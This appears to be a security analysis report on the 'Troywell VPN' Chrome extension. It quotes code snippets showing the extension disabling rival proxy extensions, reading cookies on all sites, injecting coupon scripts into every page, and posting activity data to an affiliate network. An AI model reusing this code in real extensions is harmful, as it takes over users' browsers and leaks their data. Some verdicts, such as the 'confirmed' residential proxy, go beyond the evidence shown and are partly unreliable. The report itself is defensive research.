# Security Analysis Report: Free VPN for Chrome - Troywell VPN

**Extension ID:** adlpodnneegcnbophopdmhedicjbcgco
**Version:** 5.0.3
**Users:** ~600,000
**Overall Risk:** HIGH

---

## Executive Summary

Troywell VPN is a free VPN extension with aggressive affiliate/cashback functionality that raises multiple security concerns. The extension operates as a **residential proxy vendor**, disables competing VPN extensions, injects coupon-testing scripts into all websites, and exfiltrates comprehensive browsing data to third-party affiliate networks. While the VPN functionality appears legitimate, the bundled "CAA" (CityAds Affiliate) system exhibits invasive behavior typical of adware and affiliate fraud extensions.

**Key Concerns:**
- Operates residential proxy infrastructure (RS/WiFi proxy types)
- Automatic disabling of competing proxy/VPN extensions
- Universal content script injection for coupon/affiliate manipulation
- Data exfiltration to CityAds affiliate network
- Comprehensive cookie harvesting across all domains
- Remote kill-switch configuration ("Thanos" and "Terminator" configs)

---

## Vulnerability Details

### 1. RESIDENTIAL PROXY INFRASTRUCTURE ⚠️ HIGH

**Severity:** HIGH
**Files:** `bg/bundle.js` (lines 5413-5414, 5926-5932)
**CWE:** CWE-918 (Server-Side Request Forgery)

**Evidence:**
```javascript
RESIDENTIAL_COUNTRIES: "https://proxy-api.".concat(Vt, "/v1/wifi/geo-list"),
RESIDENTIAL_CONNECT: "https://proxy-api.".concat(Vt, "/v1/wifi/proxy-list?country=%county%"),

// Proxy type tracking
"LTE" === e.proxyType && (e.limitation.mobileTime -= 1, ...)
"RS" === e.proxyType && (e.limitation.wifiTime -= 1, ...)
"DC" === e.proxyType && (r = 60 * e.dcTiming * 60 - a)
```

**Analysis:**
The extension offers three proxy types: DC (datacenter), LTE (mobile), and RS (residential/WiFi). The residential proxy endpoints at `proxy-api.troywell.org/v1/wifi/` suggest the extension routes user traffic through other users' devices, creating a peer-to-peer proxy network. This is a classic residential proxy monetization scheme where free users become exit nodes.

**Time limitations** are enforced differently for each proxy type:
- DC: 12/3/6/9 hours (lines 3747)
- WiFi: 60/15/30/45 minutes (lines 3748)
- Mobile: 20/5/10/15 minutes (lines 3749)

**Verdict:** CONFIRMED MALICIOUS BEHAVIOR - Operating a residential proxy network without clear disclosure is deceptive and potentially exposes users to legal liability for traffic routed through their connections.

---

### 2. COMPETING EXTENSION DISABLING ⚠️ HIGH

**Severity:** HIGH
**Files:** `bg/bundle.js` (lines 8606-8653)
**CWE:** CWE-506 (Embedded Malicious Code)

**Evidence:**
```javascript
chrome.management.getAll((function(e) {
  var n = e.filter((function(t) {
    var e = t.enabled,
      n = t.permissions,
      r = t.name;
    return e && n.find((function(t) {
      return "proxy" === t
    })) && !r.toLowerCase().includes("troywell")
  }));
  t(n.map((function(t) {
    return t.id
  })))
}))

t.sent.forEach((function(t) {
  t !== chrome.runtime.id && chrome.management.setEnabled(t, !1)
}))
```

**Analysis:**
Function `ia()` (lines 8606-8653) enumerates all installed extensions, identifies those with "proxy" permission that aren't named "troywell", and **forcibly disables them**. This anti-competitive behavior eliminates user choice and is a red flag for malicious intent.

**Note:** While standard VPN/proxy extension behavior, this is appropriately flagged given the context of other invasive behaviors.

**Verdict:** CONCERNING - Combined with residential proxy operation, this ensures users cannot escape the proxy network once connected.

---

### 3. UNIVERSAL COUPON INJECTION & AFFILIATE FRAUD ⚠️ MEDIUM

**Severity:** MEDIUM
**Files:** `content/caa/bundle.js`, `bg/bundle.js` (lines 4935-4941, 7347-7399, 8950-9108)
**CWE:** CWE-506 (Embedded Malicious Code), CWE-913 (Improper Control of Dynamically-Managed Code Object)

**Evidence:**
```javascript
// Content script injected on ALL sites
"matches": ["<all_urls>"],
"js": ["content/caa/bundle.js"],
"run_at": "document_end"

// Coupon testing automation
dispatchEvent(r) // Simulates clicks, keypresses, form submissions
document.cookie.match(...)
localStorage.getItem(n.name)
sessionStorage.getItem(`Engine-${t}`)

// Affiliate transaction creation
fetch(Xt, { // Xt = "/api/transaction/create"
  method: "POST",
  body: JSON.stringify({ merchantId: r, network: a, activationType: c })
})

// CityAds analytics exfiltration
fetch("https://cityads.com/mobilerewards/analytics/activity/vpn", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(r)
})
```

**Analysis:**
The CAA (CityAds Affiliate) content script injects into every webpage to:
1. **Monitor shopping sites** for merchant/retailer presence
2. **Test coupons** by simulating user input (keystrokes, clicks, form submissions)
3. **Inject affiliate deep links** to redirect purchases through CityAds network
4. **Track conversions** and send analytics to `cityads.com`

The extension fetches coupon codes from `Ut + "/api/coupons"` and merchant offers from `Ut + "/api/offers"`, then automatically tests them in checkout flows.

**Verdict:** CONFIRMED - This is aggressive affiliate fraud behavior. The extension hijacks shopping sessions to insert affiliate links, replacing organic purchases with commissioned ones.

---

### 4. COMPREHENSIVE COOKIE & DATA HARVESTING ⚠️ MEDIUM

**Severity:** MEDIUM
**Files:** `bg/bundle.js` (lines 4579, 6844, 8328, 9589, 10480)
**CWE:** CWE-359 (Exposure of Private Information)

**Evidence:**
```javascript
chrome.cookies.getAll(t, e)
chrome.cookies.set({ ... })
chrome.cookies.remove({ url: ..., name: ... })

// Cookie tracking for affiliate sessions
clearInterval(n), chrome.cookies.getAll(t, e)

// Storage of transaction data with merchant IDs
transactions: r  // Stored in chrome.storage.local
```

**Analysis:**
The extension has `cookies` permission with `<all_urls>` host access, allowing it to:
- Read cookies from all websites
- Set tracking cookies for affiliate attribution
- Monitor session cookies across shopping sites

Combined with the `management` permission, this enables complete visibility into user browsing sessions and authentication states across the web.

**Verdict:** CONCERNING - Excessive cookie access for a VPN extension. The stated functionality (VPN) doesn't require universal cookie access, but the hidden affiliate system does.

---

### 5. REMOTE KILL-SWITCH CONFIGURATION ⚠️ MEDIUM

**Severity:** MEDIUM
**Files:** `bg/bundle.js` (lines 3724-3725, 4657-4658, 7950-8506)
**CWE:** CWE-506 (Embedded Malicious Code)

**Evidence:**
```javascript
THANOS_CONFIG: "".concat(A, "/api/configs/thanos"),
THANOS_CONFIG_MODIFIED_DATE: "".concat(A, "/api/configs/getLastModifiedDate/thanos"),
// ...
Jt = "".concat(Ut, "/api/configs/thanos"),
Kt = "".concat(Ut, "/api/configs/terminator"),

// Thanos extension storage and config fetch
chrome.storage.local.get("thanosConfigs")
chrome.storage.local.get("thanosExtStorage")
chrome.storage.local.get("terminatorConfigs")

// Extension enable/disable based on Thanos list
chrome.management.setEnabled(f, e)
```

**Analysis:**
The extension fetches remote configuration files named "Thanos" and "Terminator" that control extension behavior. These configs can:
- Store lists of extension IDs to disable (`thanosExtStorage`)
- Modify content blocking rules
- Update affiliate network parameters

The "Thanos" naming suggests batch operations (disabling/enabling extensions en masse), while "Terminator" likely controls ad/tracker blocking configs.

**Verdict:** CONCERNING - Remote kill-switch capability allows operators to modify extension behavior post-installation without user consent. Could be weaponized to disable security tools or push malicious configs.

---

### 6. DYNAMIC CODE EXECUTION ⚠️ LOW

**Severity:** LOW
**Files:** `bg/bundle.js` (lines 414, 1160, 2921, 3362, 3482)
**CWE:** CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

**Evidence:**
```javascript
Function("return this")()
Function("r", "regeneratorRuntime = r")(r)
```

**Analysis:**
Uses `Function()` constructor for polyfill purposes (Babel regenerator runtime, global `this` detection). This is standard transpiled code pattern, not evidence of malicious dynamic code execution.

**Verdict:** FALSE POSITIVE - Legitimate polyfill usage in transpiled code.

---

## False Positives

| Pattern | Location | Explanation |
|---------|----------|-------------|
| `Function("return this")()` | bg/bundle.js:414, 3482 | Babel regenerator polyfill for global `this` detection |
| `charCodeAt` / `fromCharCode` | bg/bundle.js:6489 | Caesar cipher obfuscation of proxy credentials (shift by 1) - likely to hide credentials in source, not malicious |
| `chrome.proxy.settings.set` | bg/bundle.js:5981 | Expected VPN functionality |
| Proxy authentication | bg/bundle.js:6472-6497 | Legitimate `webRequest.onAuthRequired` handler for proxy auth |

---

## API Endpoints & Domains

### Primary Infrastructure
- **troywell.org** - Main domain (`Vt = "troywell.org"`)
- **ext.troywell.org** - Extension API server
- **analytics.troywell.org** - Analytics collection
- **proxy-api.troywell.org** - Residential proxy coordination
- **cdn.translations.troywell.org** - Localization

### Third-Party Services
- **cityads.com** - Affiliate network partner
  - `https://cityads.com/mobilerewards/analytics/activity/vpn` - Analytics endpoint
- **AWS S3** - VPN server list storage
  - `https://vpn-troywell.org-proxy.s3.us-west-1.amazonaws.com/vpn-list.json`

### Key API Endpoints
```
GET  /api/vpn/countries           - Available VPN locations
POST /api/vpn/connect/%country%   - Initiate VPN connection
POST /api/vpn/disconnect          - Terminate VPN connection
GET  /api/vpn/ip                  - GeoIP lookup
GET  /v1/wifi/geo-list           - Residential proxy countries
GET  /v1/wifi/proxy-list         - Residential proxy servers
POST /api/transaction/create      - Create affiliate transaction
GET  /api/offers                  - Fetch affiliate offers
GET  /api/coupons                 - Fetch coupon codes
POST /api/coupons/updateUsageStatus - Report coupon usage
GET  /api/configs/thanos          - Remote kill-switch config
GET  /api/configs/terminator      - Extension disable list
POST /api/extension/create        - Extension installation tracking
POST /api/extension/ping          - Analytics ping
```

---

## Data Flow Summary

### Outbound Data (User → Servers)
1. **VPN Connection Metadata**
   - Selected country, connection timestamps
   - Usage duration by proxy type (DC/LTE/RS)
   - IP geolocation data

2. **Browsing Activity**
   - Visited merchant domains (via `merchantDomains` storage)
   - Shopping cart contents during coupon testing
   - Transaction creation with merchant IDs
   - Cookie values across all sites

3. **Analytics & Telemetry**
   - Extension installation/activation events
   - VPN connection/disconnection events
   - Coupon usage success/failure rates
   - CityAds affiliate activity reports

4. **Extension Enumeration**
   - List of installed extension IDs
   - Extension enable/disable states
   - Competing proxy extension detection

### Inbound Data (Servers → User)
1. **VPN Configuration**
   - Proxy server lists (DC/LTE/RS types)
   - Authentication tokens
   - Connection time limitations

2. **Affiliate/Coupon Data**
   - Merchant offer lists
   - Coupon codes and deep links
   - Domain-to-merchant mappings

3. **Remote Control**
   - Thanos/Terminator configs (extension disable lists)
   - Ad blocking rules
   - Version check/update triggers

---

## Permissions Analysis

### Excessive Permissions
- **`management`** - Used to disable competing extensions (anti-competitive)
- **`cookies` + `<all_urls>`** - Universal cookie access for affiliate tracking
- **`scripting`** - Dynamic code injection for ad/tracker blocking
- **`webRequest` + `webRequestAuthProvider`** - Full traffic interception (expected for VPN)

### Justified Permissions
- **`proxy`** - Required for VPN functionality
- **`storage`** - Config and state persistence
- **`declarativeNetRequest`** - Ad/tracker blocking (though bundled with VPN is unusual)

---

## Indicators of Compromise (IoC)

### Behavioral Indicators
- Extensions with "proxy" permission are automatically disabled
- Checkout pages experience automated form interactions (coupon testing)
- Redirects to affiliate deep links on shopping sites
- Increased network traffic to `*.troywell.org` and `cityads.com`

### Network Indicators
```
cityads.com/mobilerewards/analytics/activity/vpn
*.troywell.org/api/*
proxy-api.troywell.org/v1/wifi/*
analytics.troywell.org/api/extension/*
```

### Storage Artifacts
```javascript
chrome.storage.local:
  - thanosConfigs
  - thanosExtStorage
  - terminatorConfigs
  - merchantDomains
  - transactions
  - connectedProxy (with login/pass/token)
```

---

## Overall Risk Assessment

**Risk Level:** HIGH

### Risk Breakdown
| Category | Severity | Justification |
|----------|----------|---------------|
| Residential Proxy Operation | HIGH | Users become exit nodes without informed consent |
| Competing Extension Killing | HIGH | Anti-competitive behavior typical of malware |
| Affiliate Fraud | MEDIUM | Aggressive coupon injection and transaction hijacking |
| Cookie Harvesting | MEDIUM | Universal cookie access for tracking |
| Remote Kill-Switch | MEDIUM | Post-install behavior modification capability |
| Data Exfiltration | MEDIUM | Comprehensive browsing data sent to CityAds |

### Why Not CRITICAL?
- No credential theft (password fields not targeted)
- No cryptocurrency mining detected
- No self-propagating worm behavior
- VPN functionality appears legitimate (when not operating in residential mode)

### Why HIGH?
1. **Residential proxy operation** exposes users to legal liability for traffic routed through their connections
2. **Anti-competitive extension killing** is malicious by definition
3. **Undisclosed affiliate fraud** hijacks user purchases for profit
4. **Comprehensive data collection** far exceeds stated VPN functionality
5. **Remote control capabilities** allow post-install weaponization

---

## Recommendations

### For Users
1. **UNINSTALL IMMEDIATELY** - This extension monetizes user connections as residential proxies
2. Review browser cookies and clear affiliate tracking cookies
3. Check for disabled extensions in `chrome://extensions`
4. Consider legitimate VPN services (NordVPN, ProtonVPN, Mullvad)

### For Researchers
1. Monitor `proxy-api.troywell.org` for residential proxy infrastructure details
2. Investigate CityAds affiliate network for similar extensions
3. Check for other Troywell-branded extensions (appears to be an affiliate network operator)
4. Analyze "Thanos" and "Terminator" config responses for extension kill lists

### For Chrome Web Store
1. **REMOVE FROM STORE** - Violates CWS policies on:
   - Deceptive behavior (hidden residential proxy)
   - Anti-competitive practices (extension killing)
   - Undisclosed affiliate functionality
2. Investigate publisher's other extensions
3. Consider banning Troywell/CityAds-affiliated developers

---

## Conclusion

Troywell VPN masquerades as a free VPN service but operates a **residential proxy network** that routes third-party traffic through user connections, **disables competing VPN extensions**, and **hijacks shopping sessions** for affiliate commissions. While the VPN functionality may work as advertised, the undisclosed residential proxy and aggressive affiliate fraud behaviors constitute **high-risk malicious activity**.

The extension's use of remote kill-switch configs ("Thanos"/"Terminator"), comprehensive cookie harvesting, and data exfiltration to CityAds demonstrates sophisticated monetization infrastructure designed to extract maximum value from users while minimizing transparency.

**Recommendation: AVOID** - Users seeking legitimate VPN functionality should choose transparent, audited VPN providers rather than free extensions with undisclosed residential proxy operations.
